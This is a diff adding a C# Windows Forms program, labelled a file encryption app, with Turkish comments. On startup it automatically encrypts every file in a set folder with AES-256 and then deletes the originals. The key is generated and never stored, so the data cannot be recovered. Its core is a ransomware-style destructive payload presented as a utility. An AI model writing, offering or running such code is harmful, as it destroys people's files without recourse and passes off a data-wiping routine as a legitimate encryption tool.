@@ -1,0 +1,61 @@
+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Windows.Forms;
+
+namespace FileEncryptionApp
+{
+    public partial class MainForm : Form
+    {
+        private readonly string folderPath = "your_folder_path"; // Şifreleme yapılacak klasör yolu
+
+        public MainForm()
+        {
+            InitializeComponent();
+            StartFileEncryption();
+        }
+
+        private void StartFileEncryption()
+        {
+            try
+            {
+                string[] files = Directory.GetFiles(folderPath);
+
+                foreach (string filePath in files)
+                {
+                    string encryptedFilePath = Path.ChangeExtension(filePath, ".encrypted");
+
+                    using (Aes aesAlg = Aes.Create())
+                    {
+                        aesAlg.KeySize = 256;
+                        aesAlg.Mode = CipherMode.CBC;
+
+                        aesAlg.GenerateIV();
+
+                        using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                        {
+                            using (FileStream encryptedFileStream = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write))
+                            {
+                                // IV'yi çıktı dosyasının başına yaz
+                                encryptedFileStream.Write(aesAlg.IV, 0, aesAlg.IV.Length);
+
+                                using (CryptoStream cryptoStream = new CryptoStream(encryptedFileStream, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
+                                {
+                                    inputFileStream.CopyTo(cryptoStream);
+                                }
+                            }
+                        }
+                    }
+
+                    File.Delete(filePath); // Orijinal dosyayı sil
+                }
+
+                MessageBox.Show("Dosyaların otomatik şifrelemesi tamamlandı.");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Hata oluştu: " + ex.Message);
+            }
+        }
+    }
+}
